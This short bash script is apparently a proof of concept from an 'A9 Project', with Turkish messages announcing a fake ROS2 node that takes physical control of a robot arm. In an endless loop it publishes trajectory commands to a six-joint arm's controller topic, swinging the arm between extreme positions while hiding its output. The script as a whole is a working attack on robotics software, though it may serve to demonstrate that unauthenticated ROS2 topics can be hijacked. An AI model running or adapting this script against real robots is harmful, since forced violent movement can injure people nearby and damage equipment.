#!/bin/bash
# A9 Project - PoC: Rogue Node Command Injection (Aggressive Movement)

echo "⚠️ SİSTEME SIZILIYOR... SAHTE DÜĞÜM BAŞLATILDI ⚠️"
echo "Hedef Topic: /joint_trajectory_controller/joint_trajectory"
echo "Durum: Robotun fiziksel kontrolü ele geçiriliyor!"

while true; do
  echo "💥 Saldırı 1: Robot sağa bükülüyor!"
  ros2 topic pub -1 /joint_trajectory_controller/joint_trajectory trajectory_msgs/msg/JointTrajectory "{joint_names: ['shoulder_pan_joint', 'shoulder_lift_joint', 'elbow_joint', 'wrist_1_joint', 'wrist_2_joint', 'wrist_3_joint'], points: [{positions: [1.57, -0.5, 1.0, -1.5, 0.0, 0.0], time_from_start: {sec: 1, nanosec: 500000000}}]}" > /dev/null 2>&1
  sleep 2

  echo "💥 Saldırı 2: Robot sola çarpıyor!"
  ros2 topic pub -1 /joint_trajectory_controller/joint_trajectory trajectory_msgs/msg/JointTrajectory "{joint_names: ['shoulder_pan_joint', 'shoulder_lift_joint', 'elbow_joint', 'wrist_1_joint', 'wrist_2_joint', 'wrist_3_joint'], points: [{positions: [-1.57, -2.5, -1.0, 1.5, 0.0, 0.0], time_from_start: {sec: 1, nanosec: 500000000}}]}" > /dev/null 2>&1
  sleep 2
done
